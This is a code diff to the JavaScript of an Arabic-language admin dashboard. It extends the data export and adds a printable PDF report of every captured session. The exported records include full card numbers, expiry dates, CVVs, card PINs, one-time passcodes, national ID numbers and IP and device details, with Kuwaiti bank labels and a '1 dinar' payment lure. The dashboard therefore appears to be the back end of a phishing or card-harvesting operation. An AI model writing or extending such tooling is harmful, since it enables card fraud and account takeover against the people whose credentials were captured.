@@ -170,6 +170,7 @@
     accountMsg: $('account-msg'),
     exportModal: $('export-modal'),
     exportClose: $('export-close'),
+    exportPdf: $('export-pdf'),
     exportJson: $('export-json'),
     exportCsv: $('export-csv'),
     exportMsg: $('export-msg'),
@@ -1293,27 +1294,96 @@
   }
 
   // ── تصدير البيانات ──────────────────────────────────────────
-  function exportData(format) {
-    const data = filteredNotifications.map(n => {
-      const d = n.lastSeen ? new Date(n.lastSeen) : null;
-      const itemsText = (n.items && n.items.length)
-        ? n.items.map(it => `${it.name || 'منتج'} × ${it.qty || 1}`).join('، ')
-        : '';
-      const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
-      return {
-        sessionId: n.sessionId || '', name: n.name || '', phone: n.phone || '', address: n.address || '',
-        apartment: n.apartment || '', deliveryNotes: n.deliveryNotes || '', items: itemsText,
-        paymentType: paymentLabel, amount: n.amount || '',
-        bank: n.bank || '', cardNumber: n.cardNumber || '', expiry: n.expiryDate || '', cvv: n.cvv || '',
-        otp: n.otp || '', status: n.decision || n.status || '', country: n.country || '',
-        currentPage: n.currentPage || '', lastSeen: d ? d.toISOString() : '',
+  function exportToMillis(value) {
+    if (!value) return 0;
+    if (typeof value.toDate === 'function') return value.toDate().getTime();
+    const t = new Date(value).getTime();
+    return isNaN(t) ? 0 : t;
+  }
+
+  function exportIso(value) {
+    const t = exportToMillis(value);
+    return t ? new Date(t).toISOString() : '';
+  }
+
+  function exportPaymentLabel(type) {
+    if (type === 'partial') return '1 دينار';
+    if (type === 'full') return 'الطلبية كاملة';
+    return type || '';
+  }
+
+  function exportItemsText(items) {
+    return (items && items.length)
+      ? items.map(it => `${it.name || 'منتج'} × ${it.qty || 1}`).join('، ')
+      : '';
+  }
+
+  // صف واحد لكل محاولة دفع (بطاقة) ولكل رمز تحقق، مع بيانات العميل الأساسية.
+  // يعتمد على allNotifications (كامل البيانات) لا على نتائج الفلاتر المعروضة.
+  function collectExportRows() {
+    const rows = [];
+    allNotifications.forEach((n) => {
+      const base = {
+        sessionId: n.sessionId || n.id || '',
+        name: n.name || '',
+        phone: n.phone || '',
+        email: n.email || '',
+        idNumber: n.idNumber || '',
+        country: n.country || '',
+        address: n.address || '',
+        apartment: n.apartment || '',
+        deliveryNotes: n.deliveryNotes || '',
+        items: exportItemsText(n.items),
+        paymentType: exportPaymentLabel(n.paymentType),
+        amount: n.amount || '',
+        status: n.decision || n.status || '',
+        network: n.network || '',
+        ip: n.ip || '',
+        device: n.device || '',
+        browser: n.browser || '',
+        currentPage: n.currentPage || '',
+        lastSeen: exportIso(n.lastSeen),
+        sessionStartedAt: exportIso(n.sessionStartedAt),
       };
+      const cards = (n.allCards && n.allCards.length) ? n.allCards : (n.cardNumber ? [n] : []);
+      const otps = (n.allOtps && n.allOtps.length) ? n.allOtps : (n.otp ? [{ otp: n.otp }] : []);
+      const maxLen = Math.max(cards.length, otps.length, 1);
+      for (let i = 0; i < maxLen; i++) {
+        const card = cards[i] || {};
+        const otp = otps[i] || {};
+        const cardNumber = card.cardNumber || '';
+        rows.push({
+          ...base,
+          cardIndex: cardNumber ? String(i + 1) : '',
+          bank: cardNumber ? (getKuwaitBankLabel(cardNumber) || cleanFirebaseBankName(card.bankName || card.bank, cardNumber) || '') : '',
+          cardNumber,
+          cardPrefix: card.cardPrefix || card.prefix || '',
+          expiry: card.expiry || card.expiryDate || '',
+          pin: card.pin || '',
+          cvv: card.cvv || card.securityCode || '',
+          cardStatus: card.decision || '',
+          cardCreatedAt: exportIso(card.createdAt || card.timestamp),
+          otp: otp.otp || '',
+          otpCreatedAt: exportIso(otp.createdAt || otp.timestamp),
+        });
+      }
     });
-    const headers = ['sessionId', 'name', 'phone', 'address', 'apartment', 'deliveryNotes', 'items', 'paymentType', 'amount', 'bank', 'cardNumber', 'expiry', 'cvv', 'otp', 'status', 'country', 'currentPage', 'lastSeen'];
+    return rows;
+  }
+
+  function exportData(format) {
+    const data = collectExportRows();
+    if (!data.length) {
+      els.exportMsg.textContent = 'لا توجد بيانات للتصدير';
+      els.exportMsg.classList.remove('hidden');
+      setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
+      return;
+    }
     if (format === 'json') {
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
       downloadBlob(blob, `notifications-${Date.now()}.json`);
     } else {
+      const headers = Object.keys(data[0]);
       const rows = [headers.join(',')].concat(data.map(r => headers.map(h => `"${String(r[h] || '').replace(/"/g, '""')}"`).join(',')));
       downloadBlob(new Blob(['\ufeff' + rows.join('\n')], { type: 'text/csv;charset=utf-8' }), `notifications-${Date.now()}.csv`);
     }
@@ -1321,11 +1391,154 @@
     els.exportMsg.classList.remove('hidden');
     setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
   }
+
   function downloadBlob(blob, filename) {
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url; a.download = filename; a.click();
     URL.revokeObjectURL(url);
+  }
+
+  // ── تصدير PDF (تقرير كامل قابل للطباعة) ─────────────────────
+  function buildPdfReportHtml() {
+    const esc = escapeHtml;
+    const val = (v) => (v === undefined || v === null || v === '') ? '-' : String(v);
+    const fmt = (v) => {
+      const t = exportToMillis(v);
+      return t ? new Date(t).toLocaleString('ar-EG') : '-';
+    };
+    const generatedAt = new Date().toLocaleString('ar-EG');
+
+    const blocks = allNotifications.map((n, idx) => {
+      const cards = (n.allCards && n.allCards.length) ? n.allCards : (n.cardNumber ? [n] : []);
+      const otps = (n.allOtps && n.allOtps.length) ? n.allOtps : (n.otp ? [{ otp: n.otp }] : []);
+      const status = n.decision || n.status || 'pending';
+      const statusText = status === 'approved' ? 'تمت الموافقة' : status === 'rejected' ? 'تم الرفض' : 'قيد المراجعة';
+
+      const basicRows = [
+        ['الاسم', n.name], ['رقم الهاتف', n.phone], ['البريد الإلكتروني', n.email],
+        ['رقم الهوية', n.idNumber], ['الدولة', n.country], ['العنوان', n.address],
+        ['الشقة / رقم الباب', n.apartment], ['تعليمات خاصة', n.deliveryNotes],
+        ['المنتج', exportItemsText(n.items)], ['طريقة الدفع', exportPaymentLabel(n.paymentType)],
+        ['المبلغ', n.amount], ['الشبكة', n.network], ['عنوان IP', n.ip],
+        ['الجهاز', n.device], ['المتصفح', n.browser], ['الصفحة الحالية', n.currentPage],
+        ['آخر ظهور', fmt(n.lastSeen)], ['بداية الجلسة', fmt(n.sessionStartedAt)],
+      ].map(([k, v]) => `<tr><th>${esc(k)}</th><td>${esc(val(v))}</td></tr>`).join('');
+
+      const cardsHtml = cards.length ? `
+        <h3>البطاقات (${cards.length})</h3>
+        <table class="grid">
+          <thead><tr><th>#</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>PIN</th><th>CVV</th><th>الحالة</th><th>الوقت</th></tr></thead>
+          <tbody>${cards.map((c, i) => {
+            const num = c.cardNumber || '';
+            const bank = getKuwaitBankLabel(num) || cleanFirebaseBankName(c.bankName || c.bank, num);
+            const d = c.decision === 'approved' ? 'موافقة' : c.decision === 'rejected' ? 'رفض' : 'مراجعة';
+            return `<tr>
+              <td>${i + 1}</td>
+              <td>${esc(val(bank))}</td>
+              <td class="mono">${esc(val(num))}</td>
+              <td class="mono">${esc(val(c.expiry || c.expiryDate))}</td>
+              <td class="mono">${esc(val(c.pin))}</td>
+              <td class="mono">${esc(val(c.cvv || c.securityCode))}</td>
+              <td>${esc(d)}</td>
+              <td>${esc(fmt(c.createdAt || c.timestamp))}</td>
+            </tr>`;
+          }).join('')}</tbody>
+        </table>` : '<p class="muted">لا توجد بطاقات</p>';
+
+      const otpsHtml = otps.length ? `
+        <h3>رموز التحقق (${otps.length})</h3>
+        <table class="grid">
+          <thead><tr><th>#</th><th>الرمز</th><th>الوقت</th></tr></thead>
+          <tbody>${otps.map((o, i) => `<tr><td>${i + 1}</td><td class="mono">${esc(val(o.otp))}</td><td>${esc(fmt(o.createdAt || o.timestamp))}</td></tr>`).join('')}</tbody>
+        </table>` : '';
+
+      return `<section class="customer">
+        <h2>${idx + 1}. ${esc(val(n.name || n.phone || n.country || 'زائر'))} <span class="badge">${esc(statusText)}</span></h2>
+        <p class="sid">معرّف الجلسة: <span class="mono">${esc(val(n.sessionId || n.id))}</span></p>
+        <h3>المعلومات الأساسية</h3>
+        <table class="basic"><tbody>${basicRows}</tbody></table>
+        ${cardsHtml}
+        ${otpsHtml}
+      </section>`;
+    }).join('');
+
+    const styles = `
+      * { box-sizing: border-box; }
+      body { font-family: 'Tajawal', Arial, sans-serif; color: #111827; margin: 0; padding: 0; direction: rtl; }
+      h1 { font-size: 20px; margin: 0 0 4px; }
+      .meta { color: #6b7280; font-size: 12px; margin-bottom: 16px; }
+      .customer { page-break-inside: avoid; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; margin-bottom: 14px; }
+      .customer h2 { font-size: 15px; margin: 0 0 2px; border-bottom: 2px solid #10b981; padding-bottom: 6px; }
+      .customer h3 { font-size: 13px; margin: 12px 0 6px; color: #047857; }
+      .badge { font-size: 11px; font-weight: 600; background: #ecfdf5; color: #047857; border: 1px solid #a7f3d0; border-radius: 999px; padding: 1px 8px; }
+      .sid { font-size: 11px; color: #6b7280; margin: 4px 0 8px; }
+      table { width: 100%; border-collapse: collapse; font-size: 12px; }
+      .basic th { text-align: right; width: 34%; color: #6b7280; font-weight: 500; background: #f9fafb; }
+      .basic th, .basic td { border: 1px solid #e5e7eb; padding: 4px 8px; vertical-align: top; }
+      .grid th, .grid td { border: 1px solid #e5e7eb; padding: 4px 6px; text-align: center; }
+      .grid thead th { background: #f3f4f6; }
+      .mono { font-family: 'Courier New', monospace; direction: ltr; unicode-bidi: embed; }
+      .muted { color: #9ca3af; font-size: 12px; }
+      @page { size: A4; margin: 12mm; }
+    `;
+
+    return `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<title>تقرير البيانات الكامل</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet" />
+<style>${styles}</style>
+</head>
+<body>
+<h1>تقرير البيانات الكامل</h1>
+<p class="meta">عدد العملاء: ${allNotifications.length} · تاريخ الإنشاء: ${esc(generatedAt)}</p>
+${blocks || '<p class="muted">لا توجد بيانات</p>'}
+</body>
+</html>`;
+  }
+
+  function printHtmlReport(html) {
+    const iframe = document.createElement('iframe');
+    iframe.setAttribute('aria-hidden', 'true');
+    iframe.style.cssText = 'position:fixed;right:0;bottom:0;width:0;height:0;border:0;';
+    document.body.appendChild(iframe);
+    const doc = iframe.contentWindow.document;
+    doc.open();
+    doc.write(html);
+    doc.close();
+    const runPrint = () => {
+      try {
+        iframe.contentWindow.focus();
+        iframe.contentWindow.print();
+      } catch (err) {
+        console.error('PDF print error:', err);
+        toast('تعذر إنشاء ملف PDF', 'error');
+      } finally {
+        setTimeout(() => iframe.remove(), 1000);
+      }
+    };
+    // انتظار تحميل الخط/المحتوى قبل فتح نافذة الطباعة
+    if (iframe.contentWindow.document.readyState === 'complete') {
+      setTimeout(runPrint, 300);
+    } else {
+      iframe.onload = () => setTimeout(runPrint, 300);
+    }
+  }
+
+  function exportPdf() {
+    if (!allNotifications.length) {
+      els.exportMsg.textContent = 'لا توجد بيانات للتصدير';
+      els.exportMsg.classList.remove('hidden');
+      setTimeout(() => els.exportMsg.classList.add('hidden'), 2000);
+      return;
+    }
+    printHtmlReport(buildPdfReportHtml());
+    els.exportMsg.textContent = 'جارٍ تجهيز ملف PDF... اختر "حفظ كملف PDF" في نافذة الطباعة';
+    els.exportMsg.classList.remove('hidden');
+    setTimeout(() => els.exportMsg.classList.add('hidden'), 4000);
   }
 
   // ── الإعدادات ───────────────────────────────────────────────
@@ -1677,10 +1890,11 @@
 
   els.menuExport.addEventListener('click', () => { els.menuDropdown.classList.add('hidden'); els.exportModal.classList.remove('hidden'); });
   $('reference-settings')?.addEventListener('click', () => els.menuSettings.click());
-  $('reference-export')?.addEventListener('click', () => els.menuExport.click());
+  $('reference-export')?.addEventListener('click', () => exportPdf());
   $('reference-account')?.addEventListener('click', () => els.menuLogout.click());
   $('reference-bell')?.addEventListener('click', () => toast('تم تحديث قائمة الإشعارات', 'success'));
   els.exportClose.addEventListener('click', () => els.exportModal.classList.add('hidden'));
+  els.exportPdf?.addEventListener('click', () => exportPdf());
   els.exportJson.addEventListener('click', () => exportData('json'));
   els.exportCsv.addEventListener('click', () => exportData('csv'));
 
